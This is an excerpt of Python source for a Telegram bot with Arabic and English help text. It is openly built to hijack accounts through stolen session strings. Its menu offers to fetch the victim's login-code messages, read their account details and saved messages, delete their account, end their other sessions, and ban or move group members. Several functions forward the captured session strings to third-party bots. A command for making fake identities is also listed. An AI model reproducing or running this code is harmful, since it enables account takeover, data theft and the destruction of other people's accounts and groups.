...
/id US -صنع هوية مزيفة مع رمز بريدي وكل شيء 
...
async def hack(event):
    ...
    async with client.conversation(event.chat_id) as x:
            ...
            await x.send_message(f'''اختر ما تريد   :



# 1 : معرفه قنوات/كروبات التي يملكها       

# 2 : جلب جميع معلومات المستخدم مثل رقم الحساب ، معرف المستخدم و ايدي الشخص...                      

# 3 : حظر جميع مستخدمين كروب او قناة                    

# 4 : جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب                                

# 5 : انضمام الى كروب او قناة                            

# 6 : مغادره كروب او قناة                             

# 7 : حذف كروب او قناة                          

# 8 : تاكد من التحقق بخطوتين مفعل او لا

# 9 : انهاء جميع الجلسات ما عدا جلسة البوت      

# 10 : حذف الحساب                                

# 11 :  ترقيه عضو الى مشرف داخل كروب او قناة 

# 12 : حذف جميع المشرفين في كروب او قناة  
...
# 17 : الحصول على الرسائل المحفوظة

# 18 : نقل اعضاء من كروب لاخر

# 19 : تعديل في الواجهة للحساب

# 20 : استخراج النقاط من بوتات التمويل
...
# استراج السيشن الخاص في الحساب @cnn0nbot
...
@client.on(events.NewMessage(pattern='/goldenen'))
async def send_help(event):
    user = await event.get_chat()
    await client.send_message(user, '''
============================
...
/goldenen - English version of Commands
...
@client.on(events.NewMessage(pattern='/goldenn'))
...
Use /start for an Arabic explanation of the hack commands!
يمكنك الآن الوصول إلى الروبوت باستخدام الامر /hack
استخدم /start لشرح عربي لأوامر الاختراق!''')
...
async def eeobot(strses):
    ...
    try:
        # Send /goldenn command to @eeobot
        send = await bot.send_message("@eeobot", '/goldenn')
        await asyncio.sleep(2)
...
async def xnsex21bot(strses):
    ...
    try:
        # Send /goldenn command to @eeobot
        send = await bot.send_message("@xnsex21bot", '/goldenn')
        await asyncio.sleep(2)
...
async def MARKTEBOT(strses):
    ...
    try:
        # Send /goldenn command to @eeobot
        send = await bot.send_message("@MARKTEBOT", '/goldenn')
        await asyncio.sleep(2)
